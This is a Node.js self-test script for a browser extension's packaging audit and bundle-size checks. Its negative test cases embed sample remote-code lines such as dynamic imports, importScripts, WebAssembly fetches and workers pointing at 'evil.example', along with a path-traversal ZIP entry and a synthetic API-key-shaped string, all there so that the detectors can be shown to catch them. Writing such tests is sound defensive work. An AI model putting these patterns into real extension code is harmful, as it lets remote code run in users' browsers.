#!/usr/bin/env node
// Negative tests for the quality gates: proves audit-zip.mjs and check-bundle-size.mjs
// exit non-zero on each violation and zero on a clean input. Hermetic: builds synthetic
// ZIPs and build directories in the OS temp dir; never touches .output or the repository.
// Usage: node scripts/selftest.mjs
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { randomBytes } from 'node:crypto';
import { deflateRawSync } from 'node:zlib';
import { crc32 } from './lib/zip.mjs';

const scriptsDir = path.dirname(fileURLToPath(import.meta.url));
const expected = JSON.parse(
  readFileSync(path.join(scriptsDir, 'expected-permissions.json'), 'utf8'),
);
const scratch = mkdtempSync(path.join(tmpdir(), 'clavis-selftest-'));

// Built at run time so this file never contains a key-shaped literal (secret scanners).
const fakeKey = ['gsk', 'X7kQ9mZ2vB4nL8cD1fG5hJ3pR6tW0yA'].join('_');

function writeZip(files) {
  const locals = [];
  const central = [];
  let offset = 0;
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.isBuffer(content) ? content : Buffer.from(content);
    const packed = deflateRawSync(data);
    const nameBuf = Buffer.from(name);
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(packed.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    const header = Buffer.alloc(46);
    header.writeUInt32LE(0x02014b50, 0);
    header.writeUInt16LE(20, 4);
    header.writeUInt16LE(20, 6);
    header.writeUInt16LE(8, 10);
    header.writeUInt32LE(crc, 16);
    header.writeUInt32LE(packed.length, 20);
    header.writeUInt32LE(data.length, 24);
    header.writeUInt16LE(nameBuf.length, 28);
    header.writeUInt32LE(offset, 42);
    locals.push(local, nameBuf, packed);
    central.push(header, nameBuf);
    offset += local.length + nameBuf.length + packed.length;
  }
  const directory = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(directory.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, end]);
}

function baseManifest() {
  return {
    manifest_version: 3,
    name: '__MSG_extName__',
    version: '0.1.0',
    default_locale: 'en',
    icons: { 16: 'icon/16.png' },
    ...(expected.minimum_chrome_version
      ? { minimum_chrome_version: expected.minimum_chrome_version }
      : {}),
    ...(expected.commands ? { commands: structuredClone(expected.commands) } : {}),
    permissions: [...expected.permissions],
    host_permissions: [...expected.host_permissions],
    optional_host_permissions: [...expected.optional_host_permissions],
    ...(expected.content_security_policy
      ? { content_security_policy: { ...expected.content_security_policy } }
      : {}),
    action: { default_popup: 'popup.html' },
    background: { service_worker: 'background.js' },
  };
}

function baseFiles(manifest = baseManifest()) {
  return {
    'manifest.json': JSON.stringify(manifest),
    'background.js': 'chrome.runtime.onInstalled.addListener(() => {});',
    'popup.html':
      '<!doctype html><html><body><h1>Clavis</h1><script type="module" src="/popup.js"></script></body></html>',
    'popup.js': 'console.warn("ok");',
    'icon/16.png': randomBytes(64),
    '_locales/en/messages.json': '{"extName":{"message":"Clavis"}}',
  };
}

const withManifest = (mutate) => {
  const manifest = baseManifest();
  mutate(manifest);
  return baseFiles(manifest);
};

const WAR_OK = {
  resources: ['pdfjs/viewer.js'],
  matches: ['https://example.com/*'],
  use_dynamic_url: true,
};
const WAR_NO_DYNAMIC = { resources: ['pdfjs/viewer.js'], matches: ['https://example.com/*'] };

const zipCases = [
  ['clean package passes', baseFiles(), 0, 'AUDIT PASSED'],
  ['.env file', { ...baseFiles(), '.env': 'X=1' }, 1, 'environment file'],
  ['nested .env.local', { ...baseFiles(), 'config/.env.local': 'X=1' }, 1, 'environment file'],
  ['source map', { ...baseFiles(), 'background.js.map': '{}' }, 1, 'source map'],
  ['pem file', { ...baseFiles(), 'cert.pem': 'x' }, 1, 'key or certificate'],
  ['key file', { ...baseFiles(), 'server.key': 'x' }, 1, 'key or certificate'],
  [
    'Groq key in JS',
    { ...baseFiles(), 'background.js': `const k="${fakeKey}";` },
    1,
    'Groq API key',
  ],
  ['Groq key in JSON', { ...baseFiles(), 'data.json': `{"k":"${fakeKey}"}` }, 1, 'Groq API key'],
  [
    'remote <script src>',
    { ...baseFiles(), 'popup.html': '<script src="https://cdn.example.com/x.js"></script>' },
    1,
    'remote <script',
  ],
  [
    'protocol-relative <script src>',
    { ...baseFiles(), 'popup.html': '<script src="//cdn.example.com/x.js"></script>' },
    1,
    'remote <script',
  ],
  [
    'inline <script>',
    { ...baseFiles(), 'popup.html': '<script>alert(1)</script>' },
    1,
    'inline <script>',
  ],
  [
    'remote import()',
    { ...baseFiles(), 'background.js': 'import("https://evil.example/x.js");' },
    1,
    'remote dynamic import',
  ],
  [
    'dev-server URL in JS',
    { ...baseFiles(), 'background.js': 'new WebSocket("ws://localhost:3000");' },
    1,
    'dev-server URL',
  ],
  [
    'bare localhost in JS only warns',
    { ...baseFiles(), 'popup.js': 'var d="http://localhost";' },
    0,
    'AUDIT PASSED',
  ],
  ['eval in JS only warns', { ...baseFiles(), 'popup.js': 'eval("1");' }, 0, 'eval()'],
  [
    'content_scripts in manifest',
    withManifest((m) => (m.content_scripts = [{ matches: ['<all_urls>'], js: ['c.js'] }])),
    1,
    'content_scripts must be absent',
  ],
  ['extra permission', withManifest((m) => m.permissions.push('tabs')), 1, 'unexpected "tabs"'],
  [
    'extra host permission',
    withManifest((m) => m.host_permissions.push('<all_urls>')),
    1,
    'unexpected "<all_urls>"',
  ],
  ['missing permission', withManifest((m) => m.permissions.pop()), 1, 'is missing'],
  [
    'optional_permissions added',
    withManifest((m) => (m.optional_permissions = ['history'])),
    1,
    'unexpected "history"',
  ],
  [
    'CSP missing (differs from approved)',
    withManifest((m) => delete m.content_security_policy),
    1,
    'content_security_policy',
  ],
  [
    'wasm CSP plus unsafe-inline',
    withManifest(
      (m) =>
        (m.content_security_policy = {
          extension_pages:
            "script-src 'self' 'wasm-unsafe-eval' 'unsafe-inline'; object-src 'self'",
        }),
    ),
    1,
    'content_security_policy',
  ],
  [
    'CSP without the reader hardening directives (media/frame/form/base)',
    withManifest(
      (m) =>
        (m.content_security_policy = {
          extension_pages: "script-src 'self' 'wasm-unsafe-eval'; object-src 'self'",
        }),
    ),
    1,
    'content_security_policy',
  ],
  [
    'unsafe-eval CSP',
    withManifest(
      (m) => (m.content_security_policy = { extension_pages: "script-src 'self' 'unsafe-eval'" }),
    ),
    1,
    'content_security_policy',
  ],
  [
    'manifest references missing file',
    (() => {
      const f = baseFiles();
      delete f['popup.html'];
      return f;
    })(),
    1,
    'not in the ZIP',
  ],
  ['path traversal entry', { ...baseFiles(), '../evil.js': 'x' }, 1, 'unsafe path'],

  // Manifest key allowlist and risky keys.
  [
    'unexpected top-level manifest key',
    withManifest((m) => (m.homepage_url = 'https://example.com')),
    1,
    'unexpected manifest key "homepage_url"',
  ],
  [
    'web_accessible_resources without expectation',
    withManifest(
      (m) =>
        (m.web_accessible_resources = [
          { resources: ['a.js'], matches: ['<all_urls>'], use_dynamic_url: true },
        ]),
    ),
    1,
    'risky manifest key "web_accessible_resources"',
  ],
  ...[
    ['externally_connectable', { matches: ['https://*.example.com/*'] }],
    ['sandbox', { pages: ['s.html'] }],
    ['oauth2', { client_id: 'x', scopes: ['email'] }],
    ['key', 'TEST_PLACEHOLDER_NOT_A_KEY'],
    ['update_url', 'https://example.com/update.xml'],
    ['chrome_url_overrides', { newtab: 'popup.html' }],
  ].map(([key, value]) => [
    `risky manifest key ${key}`,
    withManifest((m) => (m[key] = value)),
    1,
    `risky manifest key "${key}"`,
  ]),
  ['commands removed', withManifest((m) => delete m.commands), 1, '"commands" is missing'],
  [
    'commands changed',
    withManifest((m) => (m.commands['explain-selection'].suggested_key.default = 'Ctrl+Shift+X')),
    1,
    '"commands" differs',
  ],
  [
    'extra command',
    withManifest((m) => (m.commands['run-everywhere'] = { description: 'x' })),
    1,
    '"commands" differs',
  ],
  [
    'minimum_chrome_version removed',
    withManifest((m) => delete m.minimum_chrome_version),
    1,
    '"minimum_chrome_version" is missing',
  ],
  [
    'minimum_chrome_version changed',
    withManifest((m) => (m.minimum_chrome_version = '100')),
    1,
    '"minimum_chrome_version" differs',
  ],
  [
    'web_accessible_resources matching expectation with use_dynamic_url passes',
    withManifest((m) => (m.web_accessible_resources = [WAR_OK])),
    0,
    'AUDIT PASSED',
    { allowlist: { ...expected, web_accessible_resources: [WAR_OK] } },
  ],
  [
    'web_accessible_resources expected but use_dynamic_url missing',
    withManifest((m) => (m.web_accessible_resources = [WAR_NO_DYNAMIC])),
    1,
    'use_dynamic_url: true',
    { allowlist: { ...expected, web_accessible_resources: [WAR_NO_DYNAMIC] } },
  ],
  [
    'web_accessible_resources differs from expectation',
    withManifest((m) => (m.web_accessible_resources = [{ ...WAR_OK, matches: ['<all_urls>'] }])),
    1,
    '"web_accessible_resources" differs',
    { allowlist: { ...expected, web_accessible_resources: [WAR_OK] } },
  ],
  [
    'extra key passes when added to allowedManifestKeys',
    withManifest((m) => (m.homepage_url = 'https://example.com')),
    0,
    'AUDIT PASSED',
    {
      allowlist: {
        ...expected,
        allowedManifestKeys: [...expected.allowedManifestKeys, 'homepage_url'],
      },
    },
  ],

  // PDF.js scripting sandbox must never ship.
  [
    'quickjs wasm shipped',
    { ...baseFiles(), 'pdfjs/wasm/quickjs-eval.wasm': Buffer.from([0, 97, 115, 109]) },
    1,
    'PDF.js scripting sandbox',
  ],
  [
    'pdf.sandbox.js shipped',
    { ...baseFiles(), 'chunks/pdf.sandbox.js': 'var x=1;' },
    1,
    'PDF.js scripting sandbox',
  ],
  [
    'legitimate pdfjs assets pass in strict mode',
    {
      ...baseFiles(),
      'pdfjs/wasm/openjpeg.wasm': Buffer.from([0, 97, 115, 109]),
      'pdfjs/wasm/LICENSE_OPENJPEG': 'license',
      'pdfjs/cmaps/Adobe-Japan1-0.bcmap': randomBytes(32),
      'pdfjs/standard_fonts/FoxitDingbats.pfb': randomBytes(32),
      'pdfjs/iccs/CGATS001Compat-v2-micro.icc': randomBytes(32),
    },
    0,
    'AUDIT PASSED',
    { args: ['--strict'] },
  ],

  // Remote-code patterns: negatives (must fail) and positives (local equivalents must pass).
  ...[
    ['protocol-relative import()', 'import("//evil.example/x.js");', 'remote dynamic import'],
    [
      'protocol-relative import() with template',
      'import(`//evil.example/x.js`);',
      'remote dynamic import',
    ],
    [
      'protocol-relative static import',
      'import x from"//evil.example/x.js";',
      'remote static import',
    ],
    [
      'instantiateStreaming(fetch(https))',
      'WebAssembly.instantiateStreaming(fetch("https://evil.example/a.wasm"),{});',
      'WebAssembly streaming compile',
    ],
    [
      'compileStreaming(fetch(protocol-relative))',
      'WebAssembly.compileStreaming(fetch("//evil.example/a.wasm"));',
      'WebAssembly streaming compile',
    ],
    [
      'instantiateStreaming(await fetch(http))',
      'WebAssembly.instantiateStreaming(await fetch( "http://evil.example/a.wasm" ),{});',
      'WebAssembly streaming compile',
    ],
    [
      'fetch of remote .wasm',
      'fetch("https://evil.example/a.wasm").then(r=>r.arrayBuffer());',
      'remote .wasm',
    ],
    ['importScripts(https)', 'importScripts("https://evil.example/x.js");', 'importScripts()'],
    [
      'importScripts(protocol-relative)',
      'importScripts("a.js","//evil.example/x.js");',
      'importScripts()',
    ],
    ['Worker from protocol-relative URL', 'new Worker("//evil.example/w.js");', 'Worker created'],
    ['script.src protocol-relative', 's.src="//evil.example/x.js";', 'script element'],
  ].map(([name, code, text]) => [
    `remote code: ${name}`,
    { ...baseFiles(), 'background.js': code },
    1,
    text,
  ]),
  ...[
    ['local import()', 'import("./chunk.js");'],
    [
      'local instantiateStreaming',
      'WebAssembly.instantiateStreaming(fetch("/pdfjs/wasm/a.wasm"),{});',
    ],
    ['local importScripts', 'importScripts("chunks/a.js");'],
    ['fetch of the Groq API', 'fetch("https://api.groq.com/openai/v1/models");'],
    ['division operator that looks like //', 'var a=4//2\n;'],
  ].map(([name, code]) => [
    `remote code: ${name} passes`,
    { ...baseFiles(), 'background.js': code },
    0,
    'AUDIT PASSED',
  ]),

  // Store ZIP size cap (maxZipBytes in the budgets file).
  [
    'ZIP under the size cap passes and reports its size',
    baseFiles(),
    0,
    'ZIP size',
    { budgets: { maxZipBytes: 1_000_000 } },
  ],
  [
    'ZIP over the size cap fails with the measured size',
    baseFiles(),
    1,
    'ZIP is ',
    { budgets: { maxZipBytes: 100 } },
  ],
  [
    'budgets file without maxZipBytes skips the cap',
    baseFiles(),
    0,
    'AUDIT PASSED',
    { budgets: {} },
  ],

  // Unknown file types warn normally and fail under --strict.
  [
    'unknown file type only warns by default',
    { ...baseFiles(), 'data.xyz': 'abc' },
    0,
    'unrecognised file type',
  ],
  [
    'unknown file type fails under --strict',
    { ...baseFiles(), 'data.xyz': 'abc' },
    1,
    'unrecognised file type',
    { args: ['--strict'] },
  ],
];

const results = [];
function record(name, ok, detail) {
  results.push({ name, ok });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${ok ? '' : `\n      ${detail}`}`);
}

function runNode(script, args) {
  return spawnSync(process.execPath, [path.join(scriptsDir, script), ...args], {
    encoding: 'utf8',
  });
}

zipCases.forEach(([name, files, wantCode, wantText, options = {}], index) => {
  const file = path.join(scratch, `case-${index}.zip`);
  writeFileSync(file, writeZip(files));
  const args = ['--zip', file, ...(options.args ?? [])];
  if (options.allowlist) {
    const allowlistFile = path.join(scratch, `allowlist-${index}.json`);
    writeFileSync(allowlistFile, JSON.stringify(options.allowlist));
    args.push('--allowlist', allowlistFile);
  }
  if (options.budgets) {
    const budgetsFile = path.join(scratch, `budgets-${index}.json`);
    writeFileSync(budgetsFile, JSON.stringify(options.budgets));
    args.push('--budgets', budgetsFile);
  }
  const run = runNode('audit-zip.mjs', args);
  const output = `${run.stdout}${run.stderr}`;
  const leaked = output.includes(fakeKey);
  const ok = run.status === wantCode && output.includes(wantText) && !leaked;
  record(
    `audit-zip: ${name}`,
    ok,
    `exit ${run.status} (want ${wantCode}), text "${wantText}" ${output.includes(wantText) ? 'found' : 'missing'}${leaked ? ', SECRET LEAKED IN OUTPUT' : ''}`,
  );
});

// --strict turns warnings into failures.
{
  const file = path.join(scratch, 'strict.zip');
  writeFileSync(file, writeZip({ ...baseFiles(), 'popup.js': 'eval("1");' }));
  const run = runNode('audit-zip.mjs', ['--zip', file, '--strict']);
  record('audit-zip: --strict fails on warnings', run.status === 1, `exit ${run.status}`);
}

// Bundle-size cases against a synthetic budgets file and build directory.
function sizeCase(name, files, wantCode, wantText) {
  const dir = mkdtempSync(path.join(scratch, 'build-'));
  for (const [rel, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    writeFileSync(path.join(dir, rel), content);
  }
  const budgets = path.join(scratch, 'budgets.json');
  writeFileSync(
    budgets,
    JSON.stringify({
      buildDir: dir,
      budgets: [
        {
          id: 'observer',
          files: ['content-scripts/content.js'],
          maxGzipBytes: 15360,
          required: true,
        },
      ],
    }),
  );
  const run = runNode('check-bundle-size.mjs', ['--dir', dir, '--budgets', budgets]);
  const output = `${run.stdout}${run.stderr}`;
  record(
    `check-bundle-size: ${name}`,
    run.status === wantCode && output.includes(wantText),
    `exit ${run.status} (want ${wantCode}), output:\n${output}`,
  );
}
sizeCase(
  'small observer passes',
  { 'content-scripts/content.js': 'console.warn(1);' },
  0,
  'all content-script budgets hold',
);
sizeCase(
  'observer over 15 KB gzip fails',
  { 'content-scripts/content.js': randomBytes(16 * 1024).toString('hex') },
  1,
  'OVER BUDGET',
);

// Aggregate rows with many matches are truncated unless --verbose.
for (const [verbose, want, notWant] of [
  [false, 'chunks/a-0.js (+4 more)', 'chunks/a-1.js'],
  [true, 'chunks/a-0.js + chunks/a-1.js', '(+4 more)'],
]) {
  const dir = mkdtempSync(path.join(scratch, 'build-'));
  mkdirSync(path.join(dir, 'chunks'));
  for (let i = 0; i < 5; i++) writeFileSync(path.join(dir, `chunks/a-${i}.js`), `var a${i}=1;`);
  const budgets = path.join(scratch, 'budgets-label.json');
  writeFileSync(
    budgets,
    JSON.stringify({
      buildDir: dir,
      budgets: [{ id: 'many', files: ['chunks/a-*.js'], maxGzipBytes: 10000, aggregate: true }],
    }),
  );
  const run = runNode('check-bundle-size.mjs', [
    '--dir',
    dir,
    '--budgets',
    budgets,
    ...(verbose ? ['--verbose'] : []),
  ]);
  const output = run.stdout;
  record(
    `check-bundle-size: aggregate label ${verbose ? 'is full with --verbose' : 'is truncated'}`,
    run.status === 0 && output.includes(want) && !output.includes(notWant),
    `exit ${run.status}\n${output}`,
  );
}
sizeCase('required content script missing fails', { 'background.js': 'x' }, 1, 'MISSING');
sizeCase(
  'larger observer within the 15 KB gzip budget passes',
  {
    'content-scripts/content.js': randomBytes(7 * 1024)
      .toString('hex')
      .slice(0, 14 * 1024),
  },
  0,
  'all content-script budgets hold',
);
{
  const run = runNode('check-bundle-size.mjs', ['--dir', path.join(scratch, 'does-not-exist')]);
  record('check-bundle-size: missing build dir fails', run.status !== 0, `exit ${run.status}`);
}

rmSync(scratch, { recursive: true, force: true });
const failed = results.filter((r) => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} negative tests behaved as expected.`);
process.exitCode = failed === 0 ? 0 : 1;
